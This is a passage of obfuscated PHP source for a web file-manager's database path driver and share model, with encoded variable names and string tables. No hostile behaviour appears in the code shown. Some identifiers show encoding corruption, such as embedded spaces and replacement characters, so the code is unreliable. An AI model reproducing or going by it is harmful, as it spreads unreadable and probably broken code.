$üÆşœš»[1319]; $ŞÔ‚”° = gmdate($üÆşœš»[1320], time() + $Ï®¿íú); $Ì„Î¤Ùò = (string) time() . $üÆşœš»[71] . (string) (time() + $Ï®¿íú); $ÔøÙ‘çÈ = array($üÆşœš»[1321] => $ŞÔ‚”°, $üÆşœš»[1322] => array(array($üÆşœš»[1323] => $ù—„¾©), array($üÆşœš»[1324] => $this->bucket), array($üÆşœš»[1325], $üÆşœš»[1326], $üÆşœš»[12]), array($üÆşœš»[1327] => $¿Ëããåú), array($üÆşœš»[1328] => $À—Ü¸àò), array($üÆşœš»[1329] => $this->accessKey), array($üÆşœš»[1330] => $Ì„Î¤Ùò))); $ÔøÙ‘çÈ = json_encode($ÔøÙ‘çÈ); $—ííª¼¶ = hash_hmac($üÆşœš»[232], $Ì„Î¤Ùò, $this->secret); $‡Ñ‘µ¡× = sha1($ÔøÙ‘çÈ); $­Å¯ú´¹ = hash_hmac($üÆşœš»[232], $‡Ñ‘µ¡×, $—ííª¼¶); $ÙÈ­‹½ë = array($üÆşœš»[1323] => $ù—„¾©, $üÆşœš»[1327] => $¿Ëããåú, $üÆşœš»[1331] => base64_encode($ÔøÙ‘çÈ), $üÆşœš»[1328] => $À—Ü¸àò, $üÆşœš»[1329] => $this->accessKey, $üÆşœš»[1332] => $Ì„Î¤Ùò, $üÆşœš»[1333] => $­Å¯ú´¹, $üÆşœš»[181] => $this->getHost()); return $ÙÈ­‹½ë; } public function fileOutLink($¡µ×œ²¸) { $€„ÛòÃß =& $_SERVER[ĞÂ¤àÓï]; if (substr($¡µ×œ²¸, 0, 7) == $€„ÛòÃß[1334]) { $¡µ×œ²¸ = $€„ÛòÃß[1335] . substr($¡µ×œ²¸, 7); } header($€„ÛòÃß[161] . $¡µ×œ²¸); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ŸëÑåÃ·) { $this->pathParse = $ŸëÑåÃ·; $this->model = Model($_SERVER[ĞÂ¤àÓï][1336]); } public function getPath($£Å÷™ºª) { return trim($£Å÷™ºª, $_SERVER[ĞÂ¤àÓï][8]); } public function pathFather($§†™ıÍ‡) { $×ğ„ğÕ÷ = $this->parse($§†™ıÍ‡); $×ğ„ğÕ÷ = $this->infoSimple($§†™ıÍ‡); return $×ğ„ğÕ÷ ? $×ğ„ğÕ÷[$_SERVER[ĞÂ¤àÓï][432]] : !1; } public function pathThis($Ä‚ªÅ€¾) { $ÂüÖ²ùË = $this->infoSimple($Ä‚ªÅ€¾); return $ÂüÖ²ùË ? $ÂüÖ²ùË[$_SERVER[ĞÂ¤àÓï][32]] : !1; } public function getPathOuter($ÒØ®Óš) { if (!$ÒØ®Óš) { return $ÒØ®Óš; } $ùğå…—ğ = $this->parse($ÒØ®Óš); return KodIO::make($ùğå…—ğ[$_SERVER[ĞÂ¤àÓï][399]]); } public function copyFolderFromIO($æéò·±¡, $êµ¿Ë², $ºÂ„Àö×, $ôÇï¦ºÒ, $ÍØ´€Ÿµ) { $£ËŸ¯Š¾ = $this->model->copyFolderFromIO($æéò·±¡, $êµ¿Ë², $ºÂ„Àö×, $ôÇï¦ºÒ, $ÍØ´€Ÿµ); return KodIO::make($£ËŸ¯Š¾); } public function isParentOf($´âŞôı, $çø‚­òõ) { return $this->model->isParentOf($´âŞôı, $çø‚­òõ); } public function mkfile($åıá£çÀ, $Û”ã½× = '', $ğÓ¿’“ = REPEAT_RENAME) { $¥ıšŒ˜å =& $_SERVER[ĞÂ¤àÓï]; $Ç»ÚÖ†„ = $this->parse($åıá£çÀ); $åıá£çÀ = $Ç»ÚÖ†„[$¥ıšŒ˜å[399]]; for ($Ë„“¦Å© = 0; $Ë„“¦Å© < count($Ç»ÚÖ†„[$¥ıšŒ˜å[1337]]); $Ë„“¦Å©++) { $«’“­°Ù = $Ç»ÚÖ†„[$¥ıšŒ˜å[1337]][$Ë„“¦Å©]; if ($Ë„“¦Å© == count($Ç»ÚÖ†„[$¥ıšŒ˜å[1337]]) - 1) { $åıá£çÀ = $this->model->mkfile($åıá£çÀ, $«’“­°Ù, $Û”ã½×, $ğÓ¿’“); break; } $åıá£çÀ = $this->model->mkdir($åıá£çÀ, $«’“­°Ù, REPEAT_SKIP); } return $this->getPathOuter($åıá£çÀ); } public function mkdir($È”„Ä½Î, $ù‘•äÈ« = REPEAT_SKIP) { $ê¬ÂçØ =& $_SERVER[ĞÂ¤àÓï]; $à”¢ùÒÁ = $this->parse($È”„Ä½Î); $È”„Ä½Î = $à”¢ùÒÁ[$ê¬ÂçØ[399]]; for ($‚şÜ‡è = 0; $‚şÜ‡è < count($à”¢ùÒÁ[$ê¬ÂçØ[1337]]); $‚şÜ‡è++) { $¥²µŒ¼ê = $à”¢ùÒÁ[$ê¬ÂçØ[1337]][$‚şÜ‡è]; $È”„Ä½Î = $this->model->mkdir($È”„Ä½Î, $¥²µŒ¼ê, $ù‘•äÈ«); } return $this->getPathOuter($È”„Ä½Î); } public function copyFile($ßòØêÂÜ, $¤úÀ¶›æ, $Â‡š„ = REPEAT_REPLACE) { $ß¢öç°ö =& $_SERVER[ĞÂ¤àÓï]; $ Çõ¤„‘ = $this->parse($¤úÀ¶›æ); $—àÒ‘Ãœ = $this->model->copy($ßòØêÂÜ, $ Çõ¤„‘[$ß¢öç°ö[399]], $Â‡š„, $ Çõ¤„‘[$ß¢öç°ö[84]]); return $—àÒ‘Ãœ ? $this->getPathOuter($—àÒ‘Ãœ) : !1; } public function moveFile($—ÏÛËÙö, $ÙÂÔÛšë, $¼‡Ò°–¸ = REPEAT_REPLACE) { $îíÑ–¤ =& $_SERVER[ĞÂ¤àÓï]; $ê¡ÖÁó½ = $this->parse($ÙÂÔÛšë); $Ãê˜¸¥ = $this->model->move($—ÏÛËÙö, $ê¡ÖÁó½[$îíÑ–¤[399]], $¼‡Ò°–¸, $ê¡ÖÁó½[$îíÑ–¤[84]]); return $Ãê˜¸¥ ? $this->getPathOuter($Ãê˜¸¥) : !1; } public function copy($È¼Ò¼ÅÃ, $¢Ë€¨¥, $ƒİæñ—á = REPEAT_REPLACE, $Ó—§ĞÃ = false) { $¼¢ü³“ = $this->parse($¢Ë€¨¥); $‘ØÒĞ¬Ğ = $this->model->copy($È¼Ò¼ÅÃ, $¼¢ü³“[$_SERVER[ĞÂ¤àÓï][399]], $ƒİæñ—á, $Ó—§ĞÃ); return $‘ØÒĞ¬Ğ ? $this->getPathOuter($‘ØÒĞ¬Ğ) : !1; } public function moveSameAllow() { } public function move($½ÔÆ÷Ç£, $ûÍÖ¯Ö€, $ãÒ“¡–ı = REPEAT_REPLACE, $ÕÅµ™± = false) { $õŞ½Üññ = $this->parse($ûÍÖ¯Ö€); $×Ÿ©ƒÙ’ = $this->model->move($½ÔÆ÷Ç£, $õŞ½Üññ[$_SERVER[ĞÂ¤àÓï][399]], $ãÒ“¡–ı, $ÕÅµ™±); return $×Ÿ©ƒÙ’ ? $this->getPathOuter($×Ÿ©ƒÙ’) : !1; } public function remove($ëİØ›ãµ, $›Ï÷” = true) { return $this->model->remove($ëİØ›ãµ, $›Ï÷”); } public function rename($òˆ˜°×ª, $¼Òçı£) { $íšÓŞ´ê = $this->model->rename($òˆ˜°×ª, $¼Òçı£); return $íšÓŞ´ê ? $this->getPathOuter($òˆ˜°×ª) : $íšÓŞ´ê; } public function size($¿Äëœ€¸) { $À¥•²ş€ = $this->infoSimple($¿Äëœ€¸); return $À¥•²ş€ ? $À¥•²ş€[$_SERVER[ĞÂ¤àÓï][76]] : 0; } public function infoSimple($Ûô¤³“ª) { return $this->model->sourceInfo($Ûô¤³“ª); } public function info($•Œ’ÏùÈ) { return $this->infoParse($•Œ’ÏùÈ); } public function infoAuth($À®¥“‡Ë) { return $this->infoParse($À®¥“‡Ë, !1, !0); } public function infoWithChildren($üûå¹š²) { return $this->infoParse($üûå¹š², !0); } protected function infoParse($…Ì¯‘İœ, $¨¾²±ûÒ = false, $÷•È‘¤½ = false) { if (!$¨¾²±ûÒ) { return $this->model->pathInfo($…Ì¯‘İœ, $÷•È‘¤½); } return $this->model->pathInfoMore($…Ì¯‘İœ); } public function infoFull($Üß¾ÑÖå) { $àÚ»¬Ç° =& $_SERVER[ĞÂ¤àÓï]; $ÒÒ›ûæ¿ = explode($àÚ»¬Ç°[8], $Üß¾ÑÖå); $ºƒŸôÆ¿ = implode($àÚ»¬Ç°[8], array_splice($ÒÒ›ûæ¿, 1)); return $this->model->pathInfoByPath($ÒÒ›ûæ¿[0], $ºƒŸôÆ¿); } public function hashSimple($Ë¸”ı×) { $öü¿î£î =& $_SERVER[ĞÂ¤àÓï]; $ËúÆÑğ = $this->infoWithChildren($Ë¸”ı×); return $ËúÆÑğ[$öü¿î£î[170]][$öü¿î£î[177]]; } public function hashMd5($‘ô­Üœ­) { $Û¡¾½¾¬ =& $_SERVER[ĞÂ¤àÓï]; $ŸÜğñé = $this->infoWithChildren($‘ô­Üœ­); return $ŸÜğñé[$Û¡¾½¾¬[170]][$Û¡¾½¾¬[176]]; } public function exist($Š»­ƒĞ) { $¸ı–Ÿ =& $_SERVER[ĞÂ¤àÓï]; $ƒòáä²» = $this->parse($Š»­ƒĞ); if (!$ƒòáä²»[$¸ı–Ÿ[84]]) { return $this->isFile($Š»­ƒĞ) || $this->isFolder($Š»­ƒĞ); } $¡é ¢š = array($¸ı–Ÿ[401] => $ƒòáä²»[$¸ı–Ÿ[399]], $¸ı–Ÿ[32] => $ƒòáä²»[$¸ı–Ÿ[84]]); $µ¡¥çÅÇ = $this->model->where($¡é ¢š)->find(); return $µ¡¥çÅÇ ? !0 : !1; } public function isFile($Üİ„À½) { $û²…µÏ¾ =& $_SERVER[ĞÂ¤àÓï]; $©Ãù‹Ä¦ = $this->infoSimple($Üİ„À½); return $©Ãù‹Ä¦ && $©Ãù‹Ä¦[$û²…µÏ¾[410]] == $û²…µÏ¾[88] ? !1 : !0; } public function isFolder($·¿¯Ï°®) { $ÉË¡öã =& $_SERVER[ĞÂ¤àÓï]; $çêÂÊÚ³ = $this->infoSimple($·¿¯Ï°®); return $çêÂÊÚ³ && $çêÂÊÚ³[$ÉË¡öã[410]] == $ÉË¡öã[88] ? !0 : !1; } public function listPath($£®ÑÅòŠ, $á¬ØÓÅ = false) { $ó“®Ëãû =& $_SERVER[ĞÂ¤àÓï]; if ($£®ÑÅòŠ == $ó“®Ëãû[12]) { return !1; } $ÆÙÅàÚá = array($ó“®Ëãû[401] => $£®ÑÅòŠ); if ($á¬ØÓÅ) { return $this->model->listSource($ÆÙÅàÚá, -1); } return $this->model->listSource($ÆÙÅàÚá); } public function has($·Å±õù´, $ı¹ê‹ˆ­ = false, $†ÇÑ†’ = null) { $¾®Ï¦õ‘ =& $_SERVER[ĞÂ¤àÓï]; $Ğˆ˜Ø§° = $this->infoWithChildren($·Å±õù´); if ($ı¹ê‹ˆ­) { return array($¾®Ï¦õ‘[208] => $Ğˆ˜Ø§°[$¾®Ï¦õ‘[208]], $¾®Ï¦õ‘[207] => $Ğˆ˜Ø§°[$¾®Ï¦õ‘[207]]); } return $†ÇÑ†’ ? $Ğˆ˜Ø§°[$¾®Ï¦õ‘[208]] : $Ğˆ˜Ø§°[$¾®Ï¦õ‘[207]]; } public function listAll($§è½á”) { $öâ‡ş“¦ = IO::info($this->pathParse[$_SERVER[ĞÂ¤àÓï][84]]); if (!$öâ‡ş“¦) { return array(); } return $this->model->listAll($§è½á”); } public function getContent($Î§ì¶Ú) { return $this->model->getContent($Î§ì¶Ú); } public function setContent($²¨Ş®º¨, $ä—È·¾ = '') { return $this->model->setContent($²¨Ş®º¨, $ä—È·¾); } public function fileSubstr($•ÁõŸÆ£, $ğ¤ñ•Ÿı, $Ì¾½ÚÜÑ) { return $this->model->fileSubstr($•ÁõŸÆ£, $ğ¤ñ•Ÿı, $Ì¾½ÚÜÑ); } public function download($ùı¿¤±Ô, $’…Í®Ÿ’ = '') { $…·ªûÏ£ = get_path_father($’…Í®Ÿ’); $±ëÙËË‚ = get_path_this($’…Í®Ÿ’); $¸Ïøƒ“œ = $this->model->fileInfoGet($ùı¿¤±Ô); $üöÌô­ = IO::copy($¸Ïøƒ“œ[$_SERVER[ĞÂ¤àÓï][84]], $…·ªûÏ£, !1, $±ëÙËË‚); return $üöÌô­; } public function setModifyTime($ÖÏ×£¦º, $µŠâ£Ğ = '') { $®Ù…èÎ =& $_SERVER[ĞÂ¤àÓï]; if (!$ÖÏ×£¦º) { return; } $this->model->where(array($®Ù…èÎ[417] => $ÖÏ×£¦º))->save(array($®Ù…èÎ[85] => $µŠâ£Ğ)); } public function upload($°¹¯¤´ü, $­ÌåëÈ¸, $Í‰åš•à = false, $æ±¸›Ï = REPEAT_REPLACE) { $†Œí’Á =& $_SERVER[ĞÂ¤àÓï]; $‘İ‹™Å€ = $this->parse($°¹¯¤´ü); $—Âëä´® = $this->model->addFile($‘İ‹™Å€[$†Œí’Á[399]], $­ÌåëÈ¸, $‘İ‹™Å€[$†Œí’Á[84]], $Í‰åš•à, $æ±¸›Ï); return $this->getPathOuter($—Âëä´®); } public function uploadFileByID($ùÚÙ„–í, $İ‘ªÔ, $ŞØµ·®Ü) { $·ØŸÆ¸Ì =& $_SERVER[ĞÂ¤àÓï]; $•ÛÏ°€ = $this->parse($ùÚÙ„–í); $õÅ˜©öˆ = $this->model->addFileByFileID($•ÛÏ°€[$·ØŸÆ¸Ì[399]], $İ‘ªÔ, $•ÛÏ°€[$·ØŸÆ¸Ì[84]], $ŞØµ·®Ü); return $this->getPathOuter($õÅ˜©öˆ); } public function addFileByRemote($¯À¯ø‚·, $÷«„ü£†, $±Í®÷± = array(), $¯…Ëİ‹¶ = '', $¢ï¿½Ù ) { $™£ÑâĞ¹ =& $_SERVER[ĞÂ¤àÓï]; $ö¤¸áÚ = $this->parse($¯À¯ø‚·); $¯…Ëİ‹¶ = empty($¯…Ëİ‹¶) ? $ö¤¸áÚ[$™£ÑâĞ¹[84]] : $¯…Ëİ‹¶; $öÕ¼ú¥„ = $this->model->addFileByRemote($ö¤¸áÚ[$™£ÑâĞ¹[399]], $÷«„ü£†, $¯…Ëİ‹¶, $±Í®÷±, $¢ï¿½Ù ); return $this->getPathOuter($öÕ¼ú¥„); } public function uploadLink($³é‰¹°”, $†´ÏÊÈù = 0) { $¢ÑÀëµ =& $_SERVER[ĞÂ¤àÓï]; $’µÄåÂÅ = $this->parse($³é‰¹°”); $ƒÉ«ûí› = _get($GLOBALS[$¢ÑÀëµ[7]], $¢ÑÀëµ[1338]); $íşĞñø = _get($GLOBALS[$¢ÑÀëµ[7]], $¢ÑÀëµ[1339]); $³é‰¹°” = Model($¢ÑÀëµ[609])->createFileName($’µÄåÂÅ[$¢ÑÀëµ[84]], $ƒÉ«ûí›, $íşĞñø); return IO::uploadLink($³é‰¹°”, $†´ÏÊÈù); } public function fileNameAuto($…­îğÒˆ, $‰€Ö£Ï, $˜°­ÍÎå = REPEAT_REPLACE, $ÈŸÏòÌß = false) { return $this->model->fileNameAuto($…­îğÒˆ, $‰€Ö£Ï, $˜°­ÍÎå, $ÈŸÏòÌß); } public function fileNameExist($‡‡îàÌ, $æ ‡¢Š) { return $this->model->fileNameExist($‡‡îàÌ, $æ ‡¢Š); } protected function _fileOut($–ĞÛ¿ßˆ, $óëş•– = false, $Ä†ŞÅÄç = false, $Ü¯¾æšú = '', $İ¢Ó´ = false) { $Ïƒ²¼´ =& $_SERVER[ĞÂ¤àÓï]; $¥Îİ“ = $this->model->sourceInfo($–ĞÛ¿ßˆ); if ($¥Îİ“[$Ïƒ²¼´[410]] == $Ïƒ²¼´[88]) { header($Ïƒ²¼´[1340]); die; } $û±¯Èõğ = $this->model->fileInfoGet($–ĞÛ¿ßˆ); $Ü¯¾æšú = $û±¯Èõğ[$Ïƒ²¼´[176]] ? $û±¯Èõğ[$Ïƒ²¼´[176]] : $Ü¯¾æšú; $à “ŠÑğ = isset($GLOBALS[$Ïƒ²¼´[1341]]) ? $GLOBALS[$Ïƒ²¼´[1341]] : $¥Îİ“[$Ïƒ²¼´[32]]; if ($İ¢Ó´) { return IO::fileOutServer($û±¯Èõğ[$Ïƒ²¼´[84]], $óëş•–, $à “ŠÑğ, $Ü¯¾æšú); } IO::fileOut($û±¯Èõğ[$Ïƒ²¼´[84]], $óëş•–, $à “ŠÑğ, $Ü¯¾æšú); } public function fileOut($Ûœò¥úù, $Ú‡Â¼Ê = false, $ â‘€ = false, $Œ¯ÊÆ ¡ = '') { $this->_fileOut($Ûœò¥úù, $Ú‡Â¼Ê, $ â‘€, $Œ¯ÊÆ ¡); } public function fileOutServer($ºåûÅ, $œåÅ‚İ‹ = false, $²ğÍã½¯ = false, $ôÛ®‹ã = '') { $this->_fileOut($ºåûÅ, $œåÅ‚İ‹, $²ğÍã½¯, $ôÛ®‹ã, !0); } protected function _fileOutImage($²äÖş¯, $Ê’¥Ï˜› = 250) { $¿Á»ï¾È =& $_SERVER[ĞÂ¤àÓï]; $ã óĞ¯É = $this->model->pathInfo($²äÖş¯); if ($ã óĞ¯É[$¿Á»ï¾È[410]] == $¿Á»ï¾È[88]) { show_json($¿Á»ï¾È[1342] . $²äÖş¯, !1); } $Æøöì = $this->model->fileInfoGet($²äÖş¯); $Æøöì[$¿Á»ï¾È[32]] = $ã óĞ¯É[$¿Á»ï¾È[32]]; $Æøöì[$¿Á»ï¾È[169]] = $ã óĞ¯É[$¿Á»ï¾È[169]]; $GLOBALS[$¿Á»ï¾È[1341]] = $Æøöì[$¿Á»ï¾È[32]]; $GLOBALS[$¿Á»ï¾È[168]] = $Æøöì; IO::fileOutImage($Æøöì[$¿Á»ï¾È[84]], $Ê’¥Ï˜›); } public function fileOutImage($ï•î¾Ñ, $˜‡ŠÈ´ = 250) { $this->_fileOutImage($ï•î¾Ñ, $˜‡ŠÈ´); } public function fileOutImageServer($Š°İ»è·, $¨ÅÈÚĞ¡ = 250) { $this->_fileOutImage($Š°İ»è·, $¨ÅÈÚĞ¡); } public function link($ ÂûÙüª, $Ÿù×ÏÍœ = '') { $¾Œ¡ı™ş = $this->model->fileInfoGet($ ÂûÙüª); return IO::link($¾Œ¡ı™ş[$_SERVER[ĞÂ¤àÓï][84]], $Ÿù×ÏÍœ); } protected function parse($­ù´¤ê) { $Ó·¯îÉä =& $_SERVER[ĞÂ¤àÓï]; if (strstr($­ù´¤ê, $Ó·¯îÉä[8]) === !1) { return array($Ó·¯îÉä[419] => intval($­ù´¤ê), $Ó·¯îÉä[84] => $Ó·¯îÉä[12], $Ó·¯îÉä[1337] => array()); } $ä¦µ©õ‹ = explode($Ó·¯îÉä[8], trim($­ù´¤ê, $Ó·¯îÉä[8])); if (count($ä¦µ©õ‹) < 2) { show_tips(clear_html($­ù´¤ê) . $Ó·¯îÉä[1343]); } return array($Ó·¯îÉä[419] => intval($ä¦µ©õ‹[0]), $Ó·¯îÉä[84] => $ä¦µ©õ‹[1], $Ó·¯îÉä[1337] => array_slice($ä¦µ©õ‹, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ÂúÔóí¨) { $this->pathParse = $ÂúÔóí¨; $this->model = Model($_SERVER[ĞÂ¤àÓï][1336]); } public function getPathOuter($·•ĞÈ¯Ê) { $¨›ùø =& $_SERVER[ĞÂ¤àÓï]; if (!$·•ĞÈ¯Ê) { return $·•ĞÈ¯Ê; } $ø…Û¦ºÍ = $this->parse($·•ĞÈ¯Ê); return trim(KodIO::makeShare($this->pathParse[$¨›ùø[399]], $ø…Û¦ºÍ[$¨›ùø[399]]), $¨›ùø[8]); } protected function infoParse($Š’˜®°ƒ, $òÊ·¢Ãä = false, $©ÖòÉ‚Ú = false) { $¯‚â­å‚ =& $_SERVER[ĞÂ¤àÓï]; $êµÕ”‘õ = $this->pathParse[$¯‚â­å‚[399]]; $ÏòÊ…Áµ = trim($this->pathParse[$¯‚â­å‚[1169]], $¯‚â­å‚[8]); return Action($¯‚â­å‚[1344])->sharePathInfo($êµÕ”‘õ, $ÏòÊ…Áµ, $òÊ·¢Ãä); } public function infoFull($³—œÈòŞ) { $¨•·â›¶ =& $_SERVER[ĞÂ¤àÓï]; $’¨£®€ = explode($¨•·â›¶[8], trim($³—œÈòŞ, $¨•·â›¶[8])); if (count($’¨£®€) > 1) { $¦ø”—­ = implode($¨•·â›¶[8], array_splice($’¨£®€, 1)); $ÈéÙ‘ö = $this->model->pathInfoByPath($’¨£®€[0], $¦ø”—­); if (!$ÈéÙ‘ö) { return !1; } $this->pathParse[$¨•·â›¶[1169]] = $ÈéÙ‘ö[$¨•·â›¶[402]]; } return $this->infoParse($³—œÈòŞ); } public function listAll($“ë›åñÌ) { $³÷Ùğ¯ =& $_SERVER[ĞÂ¤àÓï]; $„¢¸ö•ª = IO::info($this->pathParse[$³÷Ùğ¯[84]]); if (!$„¢¸ö•ª) { return array(); } $ºê›æÔ« = $this->model->listAll($“ë›åñÌ); $Õ§ï¨©ò = Model($³÷Ùğ¯[601])->getInfo($„¢¸ö•ª[$³÷Ùğ¯[489]]); $¡—áüş¼ = Action($³÷Ùğ¯[1344]); foreach ($ºê›æÔ« as &$øóÛàïï) { check_abort(); $øóÛàïï[$³÷Ùğ¯[86]] = $¡—áüş¼->_shareItemeParse($øóÛàïï[$³÷Ùğ¯[86]], $Õ§ï¨©ò); } unset($øóÛàïï); return $ºê›æÔ«; } } goto câ·œò…; dœà‚Ñ›£°: class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\162\145"; protected $dataAuto = array(array("\155\157\x64\151\x66\171\x54\x69\x6d\145", "\164\151\155\145", "\x69\156\163\145\x72\x74\54\x75\160\x64\x61\164\145", "\x66\165\x6e\x63\164\151\157\156"), array("\143\162\145\141\x74\145\124\x69\155\x65", "\x74\151\x6d\145", "\x69\x6e\x73\145\162\164", "\146\165\156\143\164\x69\x6f\156"), array("\x6f\160\164\x69\157\x6e\163", '', "\151\x6e\x73\145\162\164\54\165\x70\x64\141\x74\x65\x2c\163\x65\x6c\x65\143\164", "\152\x73\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($™ˆó÷ÉÆ) { $êéÓÅÑ§ =& $_SERVER[ĞÂ¤àÓï]; $À¿£úÁÜ = isset($™ˆó÷ÉÆ[0]) ? $™ˆó÷ÉÆ[0] : !1; return array($êéÓÅÑ§[1993] => array(USER_ID, $êéÓÅÑ§[1994]), $êéÓÅÑ§[1934] => array($À¿£úÁÜ, $êéÓÅÑ§[1995])); } protected function listSimple() { $ƒË™İ¤µ = array($_SERVER[ĞÂ¤àÓï][1664] => USER_ID); $Óúö¥÷‹ = $this->field($this->fieldList)->where($ƒË™İ¤µ)->select(); return $Óúö¥÷‹ ? $Óúö¥÷‹ : array(); } protected function getInfo($õŸúéÖ¯, $í îú = false) { $Ì…³üÏÛ =& $_SERVER[ĞÂ¤àÓï]; if ($í îú) { return $this->_getShareInfo(array($Ì…³üÏÛ[489] => $õŸúéÖ¯)); } $ßüİ Ú» = $this->cacheFunctionGet($Ì…³üÏÛ[1936], $õŸúéÖ¯); return $ßüİ Ú»; } public function getInfoByHash($ÌÑ”è„Ù) { return $this->_getShareInfo(array($_SERVER[ĞÂ¤àÓï][491] => $ÌÑ”è„Ù)); } public function getInfoByPath($¹óÓØô) { $£ÖÄ¬æß =& $_SERVER[ĞÂ¤àÓï]; $ŒÕÜ–†Ã = array($£ÖÄ¬æß[1664] => USER_ID, $£ÖÄ¬æß[402] => $¹óÓØô); return $this->_getShareInfo($ŒÕÜ–†Ã); } public function getInfoBySourcePath($™›åÁÆø) { $®’øÌ‡ =& $_SERVER[ĞÂ¤àÓï]; $µÑ­‘º¶ = array($®’øÌ‡[1664] => USER_ID, $®’øÌ‡[1176] => $™›åÁÆø); return $this->_getShareInfo($µÑ­‘º¶); } private function _getShareInfo($ÈäÏ½ å) { $¦œƒÓ±£ =& $_SERVER[ĞÂ¤àÓï]; $šª›”† = $this->where($ÈäÏ½ å)->find(); if (!$šª›”†) { return !1; } $ÈäÏ½ å = array($¦œƒÓ±£[489] => $šª›”†[$¦œƒÓ±£[489]]); $ÁÁ×ƒ€ = $¦œƒÓ±£[1996]; $ÔÚ¬ù„Ü = Model($¦œƒÓ±£[602])->order($¦œƒÓ±£[399])->field($ÁÁ×ƒ€)->where($ÈäÏ½ å)->select(); if ($šª›”†[$¦œƒÓ±£[402]] == $¦œƒÓ±£[197]) { $šª›”†[$¦œƒÓ±£[86]] = IO::info($šª›”†[$¦œƒÓ±£[1176]]); } else { $šª›”†[$¦œƒÓ±£[86]] = Model($¦œƒÓ±£[1336])->pathInfo($šª›”†[$¦œƒÓ±£[402]]); } $šª›”†[$¦œƒÓ±£[1997]] = $ÔÚ¬ù„Ü; return $šª›”†; } protected function getInfoAuth($¶˜ÜÁˆ) { $‹ğı¼” =& $_SERVER[ĞÂ¤àÓï]; $¹…ïéÁ¥ = $this->getInfo($¶˜ÜÁˆ); if ($¹…ïéÁ¥[$‹ğı¼”[1664]] == USER_ID) { $¹…ïéÁ¥[$‹ğı¼”[413]] = $¹…ïéÁ¥[$‹ğı¼”[86]][$‹ğı¼”[413]]; } else { $¹…ïéÁ¥[$‹ğı¼”[413]] = Model($‹ğı¼”[502])->authMake($¹…ïéÁ¥[$‹ğı¼”[1997]]); } return $¹…ïéÁ¥; } protected function listData($ª£ûü±Õ = null, $ÙÓ¶ùõÆ = 300) { $×©·Ş‡ô =& $_SERVER[ĞÂ¤àÓï]; $ÀˆË“ú¡ = array(array($×©·Ş‡ô[494] => array($×©·Ş‡ô[1012], 0), $×©·Ş‡ô[496] => array($×©·Ş‡ô[1012], 0), $×©·Ş‡ô[1998] => $×©·Ş‡ô[1952])); if ($ª£ûü±Õ == $×©·Ş‡ô[1999]) { $ÀˆË“ú¡ = array($×©·Ş‡ô[494] => 1); } else { if ($ª£ûü±Õ == $×©·Ş‡ô[1161]) { $ÀˆË“ú¡ = array($×©·Ş‡ô[496] => 1); } } $ÀˆË“ú¡[$×©·Ş‡ô[1664]] = USER_ID; $«‡Ğ×÷­ = $this->where($ÀˆË“ú¡)->selectPage($ÙÓ¶ùõÆ); return $«‡Ğ×÷­; } protected function listToMe($Ü‰´Ï‰Ê = 300) { $¸Ç˜òì¥ =& $_SERVER[ĞÂ¤àÓï]; $ëøúŒ†¯ = Model($¸Ç˜òì¥[2000])->userGroupParents(USER_ID); $âÊÀ¥«€ = array($¸Ç˜òì¥[586] => SourceModel::TYPE_USER, $¸Ç˜òì¥[505] => USER_ID); if ($ëøúŒ†¯) { $âÊÀ¥«€ = array(array($¸Ç˜òì¥[586] => SourceModel::TYPE_USER, $¸Ç˜òì¥[505] => USER_ID), array($¸Ç˜òì¥[586] => SourceModel::TYPE_GROUP, $¸Ç˜òì¥[505] => array($¸Ç˜òì¥[7], $ëøúŒ†¯)), $¸Ç˜òì¥[1998] => $¸Ç˜òì¥[1952]); } $òÀåç©Ÿ = Model($¸Ç˜òì¥[602])->where($âÊÀ¥«€)->selectPage($Ü‰´Ï‰Ê); $¼®×ı…Ù = array_to_keyvalue_group($òÀåç©Ÿ[$¸Ç˜òì¥[369]], $¸Ç˜òì¥[489]); if (!$¼®×ı…Ù) { return $òÀåç©Ÿ; } $ œ‚²¨§ = $¸Ç˜òì¥[2001]; $âÊÀ¥«€ = array($¸Ç˜òì¥[489] => array($¸Ç˜òì¥[418], array_keys($¼®×ı…Ù)), $¸Ç˜òì¥[1664] => array($¸Ç˜òì¥[1014], $¸Ç˜òì¥[197])); $Ë³™ÆùÒ = $this->field($ œ‚²¨§)->where($âÊÀ¥«€)->select(); foreach ($Ë³™ÆùÒ as $¦úÕÎ´à => &$éí¾¦ÔÌ) { $éí¾¦ÔÌ[$¸Ç˜òì¥[1997]] = $¼®×ı…Ù[$éí¾¦ÔÌ[$¸Ç˜òì¥[489]]]; } unset($éí¾¦ÔÌ); $ùÖÁ‰ßÑ = array($¸Ç˜òì¥[2002] => $Ë³™ÆùÒ, $¸Ç˜òì¥[2003] => $òÀåç©Ÿ[$¸Ç˜òì¥[366]]); return $ùÖÁ‰ßÑ; } protected function shareAdd($¢Ï»ÙÏõ, $’Ò‘Ï) { $Âø¢æãÇ =& $_SERVER[ĞÂ¤àÓï]; $ÚüÊ¸‡Ê = $this->_addShareData($¢Ï»ÙÏõ, $’Ò‘Ï); if (!empty($’Ò‘Ï[$Âø¢æãÇ[2004]])) { $this->_shareAuthSet($ÚüÊ¸‡Ê, $’Ò‘Ï[$Âø¢æãÇ[2004]]); } $this->shareEventAdd($¢Ï»ÙÏõ, $’Ò‘Ï, $Âø¢æãÇ[1164]); return $ÚüÊ¸‡Ê; } protected function shareAddSystem($¤¹òÑÀÙ, $Ïó¥€¿) { $¢¦Å‚²Ä =& $_SERVER[ĞÂ¤àÓï]; $Àìö¦ş‹ = $this->_addShareData($¤¹òÑÀÙ, $Ïó¥€¿, $¢¦Å‚²Ä[1285]); $this->_shareAuthSet($Àìö¦ş‹, $Ïó¥€¿[$¢¦Å‚²Ä[2004]]); return $Àìö¦ş‹; } private function shareEventAdd($¡¿ùÅ“„, $îĞ†¶‚, $Ìü©Ê‚ = "\141\144\144") { $Ê‘ÃÀïÙ =& $_SERVER[ĞÂ¤àÓï]; if (!$¡¿ùÅ“„ || $¡¿ùÅ“„ == $Ê‘ÃÀïÙ[197]) { return; } if ($Ìü©Ê‚ == $Ê‘ÃÀïÙ[1164]) { if ($îĞ†¶‚[$Ê‘ÃÀïÙ[494]] == $Ê‘ÃÀïÙ[88]) { Model($Ê‘ÃÀïÙ[570])->eventShare($¡¿ùÅ“„, $Ê‘ÃÀïÙ[2005]); } if ($îĞ†¶‚[$Ê‘ÃÀïÙ[496]] == $Ê‘ÃÀïÙ[88]) { 